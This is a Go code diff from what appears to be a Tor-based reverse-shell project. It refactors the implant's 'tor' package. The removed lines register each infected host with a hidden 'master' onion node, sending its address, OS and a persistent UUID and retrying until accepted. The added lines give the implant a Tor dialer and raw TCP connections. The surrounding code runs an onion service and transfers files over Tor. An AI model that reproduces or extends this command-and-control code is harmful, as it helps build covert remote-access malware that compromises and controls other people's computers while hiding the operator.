@@ -3,34 +3,23 @@ package tor
 import (
 	"bytes"
 	"context"
-	"encoding/json"
 	"errors"
 	"fmt"
 	"io"
 	"io/ioutil"
-	"log"
 	"mime/multipart"
+	"net"
 	"net/http"
 	"os"
 	"path/filepath"
-	"runtime"
 	"strings"
 	"time"
 
 	"github.com/cretz/bine/tor"
-	"github.com/google/uuid"
-	"github.com/humbertovnavarro/tor-reverse-shell/pkg/os_helpers"
+	"github.com/humbertovnavarro/tor-reverse-shell/pkg/config"
 	"github.com/ipsn/go-libtor"
-	"github.com/joho/godotenv"
 )
 
-var userDirName string
-
-var masterNode string
-
-var nodeUUID string
-
-// Setup an ephemeral onion service
 var torListenConf = &tor.ListenConf{
 	RemotePorts: []int{80},
 	Version3:    true,
@@ -40,8 +29,9 @@ var torListenConf = &tor.ListenConf{
 var torStartConf = &tor.StartConf{
 	ProcessCreator: libtor.Creator,
 	DebugWriter:    os.Stdout,
-	DataDir:        getTorDataDir(),
+	DataDir:        fmt.Sprintf("%s/%s", config.UserDir, "tor"),
 }
+
 var Tor *TorContext
 var HttpClient *http.Client
 var TorClient *tor.Tor
@@ -51,57 +41,7 @@ type TorContext struct {
 	HttpClient *http.Client
 	Tor        *tor.Tor
 	Onion      *tor.OnionService
-	Master     string
-}
-
-func NodeUUID() string {
-	if nodeUUID != "" {
-		return nodeUUID
-	}
-	uuidFilePath := fmt.Sprintf("%s/%s", userDirName, "uuid")
-	exists, err := os_helpers.FileExists(uuidFilePath)
-	if err != nil {
-		panic(err)
-	}
-	if exists {
-		fileData, err := ioutil.ReadFile(uuidFilePath)
-		if err != nil {
-			panic(err)
-		}
-		nodeUUID = string(fileData)
-		return string(fileData)
-	}
-	f, err := os.Create(uuidFilePath)
-	if err != nil {
-		panic(err)
-	}
-	_nodeUUID := uuid.NewString()
-	nodeUUID = _nodeUUID
-	f.WriteString(uuid.NewString())
-	return _nodeUUID
-}
-
-func init() {
-	godotenv.Load()
-	if userDirName == "" {
-		userDirName = os.Getenv("USER_DATA_DIR")
-	}
-	if masterNode == "" {
-		masterNode = os.Getenv("MASTER_NODE")
-	}
-	if userDirName == "" {
-		panic("tor: cannot resolve user dir")
-	}
-	// Skip master check in debug mode
-	if os.Getenv("DEBUG") != "" {
-		return
-	}
-	if !strings.HasPrefix(".onion", masterNode) {
-		log.Fatalf("tor: invalid onion address: %s", masterNode)
-	}
-	if masterNode == "" {
-		panic("tor: could not resolve master node")
-	}
+	Dialer     *tor.Dialer
 }
 
 func New() (*TorContext, error) {
@@ -110,27 +50,15 @@ func New() (*TorContext, error) {
 		return nil, err
 	}
 	Tor = &TorContext{
-		Tor:    t,
-		Master: masterNode,
+		Tor: t,
 	}
 	err = Tor.newOnionService()
 	if err != nil {
 		return nil, err
 	}
-	err = Tor.newHttpClient()
+	err = Tor.NewHTTPClient()
 	if err != nil {
 		return nil, err
-	}
-	// Don't initiate handshake in debug mode
-	if os.Getenv("DEBUG") == "" {
-		for {
-			err = Tor.initiateHandshake()
-			if err == nil {
-				break
-			}
-			fmt.Printf("could not initiate handshake with %s, trying again", masterNode)
-			time.Sleep(time.Second)
-		}
 	}
 	return Tor, nil
 }
@@ -149,10 +77,8 @@ func (c *TorContext) newOnionService() error {
 	return nil
 }
 
-func (c *TorContext) newHttpClient() error {
-	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Minute)
-	defer dialCancel()
-	dialer, err := c.Tor.Dialer(dialCtx, nil)
+func (c *TorContext) NewHTTPClient() error {
+	dialer, err := c.NewDialer()
 	if err != nil {
 		return err
 	}
@@ -160,44 +86,24 @@ func (c *TorContext) newHttpClient() error {
 	return nil
 }
 
+func (c *TorContext) NewDialer() (*tor.Dialer, error) {
+	if c.Dialer != nil {
+		return c.Dialer, nil
+	}
+	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Minute)
+	defer dialCancel()
+	_dialer, err := c.Tor.Dialer(dialCtx, nil)
+	c.Dialer = _dialer
+	if err != nil {
+		return nil, err
+	}
+	return c.Dialer, nil
+}
+
 type Handshake struct {
 	Address string `json:"address"`
 	Os      string `json:"os"`
 	UUID    string `json:"id"`
-}
-
-// Let the master node know we exist
-func (c *TorContext) initiateHandshake() error {
-	address := c.Onion.Addr().String()
-	b, err := json.Marshal(&Handshake{
-		Address: address,
-		Os:      runtime.GOOS,
-		UUID:    nodeUUID,
-	})
-	if err != nil {
-		return err
-	}
-	r := bytes.NewReader(b)
-	resp, err := c.HttpClient.Post(masterNode, "application/json", r)
-	if err != nil {
-		return err
-	}
-	b, err = ioutil.ReadAll(resp.Body)
-	if string(b) != "ok" {
-		return errors.New("tor: bad response from master")
-	}
-	if err != nil {
-		return err
-	}
-	return nil
-}
-
-func getTorDataDir() string {
-	userDir, err := os.UserCacheDir()
-	if err != nil {
-		panic(err)
-	}
-	return fmt.Sprintf("%s/%s/%s", userDir, userDirName, "tor")
 }
 
 // Download a file using the tor httpClient
@@ -270,4 +176,12 @@ func fileContentsFromPath(path string) (*FileContents, error) {
 		fdata: fileBytes,
 		ftype: contentType,
 	}, nil
+}
+
+func (c *TorContext) NewTCPConn(addr string) (net.Conn, error) {
+	dialer, err := c.NewDialer()
+	if err != nil {
+		return nil, err
+	}
+	return dialer.Dial("tcp", addr)
 }
